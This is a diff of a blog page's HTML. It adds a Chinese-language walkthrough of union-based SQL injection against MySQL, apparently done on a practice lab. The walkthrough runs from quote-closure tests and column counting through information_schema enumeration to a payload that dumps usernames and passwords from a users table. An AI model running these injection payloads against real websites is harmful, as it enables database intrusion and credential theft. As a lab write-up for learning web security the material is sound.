@@ -207,7 +207,47 @@
       </header>
     
     <div class="article-entry" itemprop="articleBody">
-    
+
+
+	
+		<h2 id="id-1"><a href="#id-1" class="headerlink" title="id=1"></a>id=1</h2><p><img src="https://s1.ax1x.com/2020/07/10/UMJlp8.png" alt="UMJlp8.png"></p>
+<h2 id="id-1’-and-1-’1"><a href="#id-1’-and-1-’1" class="headerlink" title="id=1’ and 1=’1"></a>id=1’ and 1=’1</h2><p><img src="https://s1.ax1x.com/2020/07/10/UMYT2T.png" alt="UMYT2T.png"></p>
+<h2 id="id-1’-and-1-’2"><a href="#id-1’-and-1-’2" class="headerlink" title="id =1’ and 1=’2"></a>id =1’ and 1=’2</h2><p><img src="https://s1.ax1x.com/2020/07/10/UMYXZ9.png" alt="UMYXZ9.png"></p>
+<a id="more"></a>
+
+<h2 id="id-1”-and-1-”1"><a href="#id-1”-and-1-”1" class="headerlink" title="id =1” and 1=”1"></a>id =1” and 1=”1</h2><p><img src="https://s1.ax1x.com/2020/07/10/UMtpRK.png" alt="UMtpRK.png"></p>
+<h2 id="id-1”-and-1-”2"><a href="#id-1”-and-1-”2" class="headerlink" title="id =1” and 1=”2"></a>id =1” and 1=”2</h2><p><img src="https://s1.ax1x.com/2020/07/10/UMtPMD.png" alt="UMtPMD.png"></p>
+<h2 id="id-1-and-1-1"><a href="#id-1-and-1-1" class="headerlink" title="id=1 and 1=1"></a>id=1 and 1=1</h2><p><img src="https://s1.ax1x.com/2020/07/10/UMtmJP.png" alt="UMtmJP.png"></p>
+<h2 id="id-1-and-1-2"><a href="#id-1-and-1-2" class="headerlink" title="id=1 and 1=2"></a>id=1 and 1=2</h2><p><img src="https://s1.ax1x.com/2020/07/10/UMtYiq.png" alt="UMtYiq.png"></p>
+<h2 id="综上为单引号注入"><a href="#综上为单引号注入" class="headerlink" title="综上为单引号注入"></a><strong>综上为单引号注入</strong></h2><p><img src="https://s1.ax1x.com/2020/07/10/UMtNWV.png" alt="UMtNWV.png"></p>
+<p><img src="https://s1.ax1x.com/2020/07/10/UMtdQU.png" alt="UMtdQU.png"></p>
+<h2 id="字段为3列"><a href="#字段为3列" class="headerlink" title="字段为3列"></a>字段为3列</h2><p><img src="https://s1.ax1x.com/2020/07/10/UMtcJx.png" alt="UMtcJx.png"></p>
+<h2 id="查到库名（使用union时，必须前面的查找无结果所以使用-1）"><a href="#查到库名（使用union时，必须前面的查找无结果所以使用-1）" class="headerlink" title="查到库名（使用union时，必须前面的查找无结果所以使用-1）"></a>查到库名（使用union时，必须前面的查找无结果所以使用-1）</h2><p><img src="https://s1.ax1x.com/2020/07/10/UMtbfP.png" alt="UMtbfP.png"></p>
+<h2 id="id-1’-union-select-1-database-user-23"><a href="#id-1’-union-select-1-database-user-23" class="headerlink" title="id=-1’  union select 1,database(),user() %23"></a>id=-1’  union select 1,database(),user() %23</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user():   #返回当前数据库连接使用的用户</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">database(): #返回当前数据库连接使用的数据库</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">version():  #返回当前数据库的版本</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@@datadir       #数据库路径</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://sbimg.cn/image/Cgz1e" target="_blank" rel="noopener"><img src="https://wx1.sbimg.cn/2020/07/10/Cgz1e.png" alt="Cgz1e.png"></a></p>
+<h2 id="所有的库名"><a href="#所有的库名" class="headerlink" title="所有的库名"></a>所有的库名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;-8&#39;  UNION SELECT 1,2,group_concat(schema_name) from  information_schema.schemata --+</span><br></pre></td></tr></table></figure>
+
+<p>（1）SCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。</p>
+<p>（2）TABLES表:储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表。</p>
+<p>（3）COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是show columns from schemaname.tablename的结果取之此表。</p>
+<p><img src="https://wx2.sbimg.cn/2020/07/10/CgKpN.png" alt="CgKpN.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-8&#39;  union select 1,2,group_concat(table_name) from  information_schema.tables  where  table_schema&#x3D;database() --+</span><br></pre></td></tr></table></figure>
+
+<h2 id="查询出表名"><a href="#查询出表名" class="headerlink" title="查询出表名"></a>查询出表名</h2><p><img src="https://wx2.sbimg.cn/2020/07/10/CgWhj.png" alt="CgWhj.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-8&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39; users&#39; --+</span><br></pre></td></tr></table></figure>
+
+<h2 id="这里查到了id，username，password字段"><a href="#这里查到了id，username，password字段" class="headerlink" title="这里查到了id，username，password字段"></a>这里查到了id，username，password字段</h2><p><img src="https://wx2.sbimg.cn/2020/07/10/CgZfn.png" alt="CgZfn.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-8&#39;  UNION SELECT 1,2,group_concat(char(32,58,32),id,username,password) from users --+</span><br></pre></td></tr></table></figure>
+
+
+	
 
       
         <h2 id="id-1"><a href="#id-1" class="headerlink" title="id=1"></a>id=1</h2><p><img src="https://s1.ax1x.com/2020/07/10/UMJlp8.png" alt="UMJlp8.png"></p>
